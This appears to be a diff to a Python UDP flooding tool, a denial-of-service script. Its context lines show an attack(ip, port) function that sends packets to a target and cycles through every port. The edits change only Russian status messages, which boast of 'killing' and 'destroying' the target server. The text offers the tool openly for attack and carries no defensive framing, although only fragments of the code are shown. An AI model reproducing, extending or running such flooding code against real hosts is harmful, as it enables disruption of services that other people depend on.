@@ -46,7 +46,7 @@ def attack(ip, port):
 	
 	sock.sendto(str.encode(bytes), (ip,int(port)))
 	sent += 1
-	print("%s пакетов  (остановка Ctrl+z) - %s:%s"%(sent,ip,port))
+	print("%s пакетов убила сервер (остановка Ctrl+z) - %s:%s"%(sent,ip,port))
 
 	if mode == "y":
 		if sent == max:
@@ -68,4 +68,4 @@ while True:
 				if port_for_fast == 65536:
 					port_for_fast = 1
 		except:
-			print("Сервер (остановка Ctrl+z) "+ip+" выебан!")
+			print("Сервер (остановка Ctrl+z) "+ip+" уничтожен!")
